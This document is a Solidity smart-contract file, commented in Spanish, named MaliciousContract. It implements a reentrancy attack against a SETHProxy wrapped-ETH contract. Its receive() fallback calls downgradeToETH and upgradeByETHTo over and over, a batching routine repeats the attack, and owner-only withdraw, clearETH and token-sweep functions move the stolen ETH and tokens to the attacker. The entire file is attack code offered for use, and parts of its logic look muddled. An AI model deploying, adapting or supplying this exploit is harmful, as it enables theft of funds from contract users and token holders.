// SPDX-License-Identifier: MIT
import "./IERC20.sol";
pragma solidity 0.7.6;

interface SETHProxy {
    function upgradeByETH() external payable;
    function downgradeToETH(uint256 wad) external;
    function upgradeByETHTo(address to) external payable;
}

contract MaliciousContract {
    SETHProxy private target;
    uint256 private attackCount;
    uint256 private constant MAX_ATTACK_COUNT = 200000;
    address private _owner;
    address private wadTokenAddress;
    uint256 private numAttacksToPerform;
    uint256 private attacksPerformed;
    uint256 private constant BATCH_SIZE = 10;

    constructor(SETHProxy _target, address _wadTokenAddress) {
        target = _target;
        wadTokenAddress = _wadTokenAddress;
        _owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == _owner);
        _;
    }

    // Función de fallback para recibir ETH
    receive() external payable {
        if (attackCount < MAX_ATTACK_COUNT) {
            // Lanzar el ataque de reentrancia llamando a downgradeToETH repetidamente
            if (IERC20(wadTokenAddress).allowance(address(this), address(target)) == 0) {
                IERC20(wadTokenAddress).approve(address(target), uint256(-1));
            }
            target.downgradeToETH(1 ether);
            attackCount++;
            (bool success,) = address(target).call(abi.encodeWithSignature("downgradeToETH(uint256)", 1 ether));
            require(success, "Failed to call downgradeToETH");

            // Realizar la reentrancia llamando a upgradeByETHTo repetidamente
            for (uint256 i = 0; i < BATCH_SIZE; i++) {
                (bool success2,) = address(target).call(abi.encodeWithSignature("upgradeByETHTo(address)", address(this)));
                require(success2, "Failed to call upgradeByETHTo");
            }
        } else {
            revert("Max attack count reached");
        }
    }

    // Función para iniciar el ataque
    function initiateAttack() private {
        // Enviar ETH al contrato objetivo para activar el ataque de reentrancia
        target.upgradeByETH{value: 2 ether}();

        // Llamar a la función downgradeToETH para iniciar el ataque de reentrancia
        if (IERC20(wadTokenAddress).allowance(address(this), address(target)) == 0) {
            IERC20(wadTokenAddress).approve(address(target), uint256(-1));
        }
        target.downgradeToETH(1 ether);
        (bool success,) = address(target).call(abi.encodeWithSignature("downgradeToETH(uint256)", 1 ether));
        require(success, "Failed to call downgradeToETH");

        // Llamar a la función upgradeByETHTo para emitir tokens y desencadenar la reentrancia
        target.upgradeByETHTo{value: 1 ether}(address(this));
        (bool success1,) = address(target).call(abi.encodeWithSignature("upgradeByETHTo(address)", address(this)));
        require(success1, "Failed to call upgradeByETHTo");
        attackCount++;
    }

    // Función para iniciar múltiples ataques utilizando un esquema de "batching"
    function performAttack(uint256 numAttacks) external {
        require(attacksPerformed == 0, "Another attack is already in progress");
        numAttacksToPerform = numAttacks;
        attacksPerformed = 0;
        batchAttack();
    }

    function batchAttack() private {
    uint256 remainingAttacks = numAttacksToPerform - attacksPerformed;
    uint256 batchSize = remainingAttacks > BATCH_SIZE ? BATCH_SIZE : remainingAttacks;

    for (uint256 i = 0; i < batchSize; i++) {
        initiateAttack();
    }

    attacksPerformed += batchSize;

    if (attacksPerformed < numAttacksToPerform) {
        // Todavía quedan ataques por realizar, llamar a batchAttack nuevamente
        batchAttack();
    }
}

    function funds() external payable {}
    // Retirar los ETH obtenidos del ataque
    function withdraw() external onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    // Función para verificar si se alcanzó el número máximo de ataques
    function isMaxAttackCountReached() external view returns (bool) {
        return attackCount >= MAX_ATTACK_COUNT;
    }

    function clearETH(address payable _withdrawal) public onlyOwner {
        uint256 amount = address(this).balance;
        (bool success,) = _withdrawal.call{gas: 8000000, value: amount}("");
        require(success, "Failed to transfer Ether");
    }

    function remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyOwner returns(bool _sent) {
        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));
        if (number_of_tokens > randomBalance) {
            number_of_tokens = randomBalance;
        }
        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);
    }
    
    function approveAndCallTarget(uint256 amount) external onlyOwner {
        if (IERC20(wadTokenAddress).allowance(address(this), address(target)) == 0) {
            IERC20(wadTokenAddress).approve(address(target), uint256(-1));
        }
        target.downgradeToETH(amount);
    }
}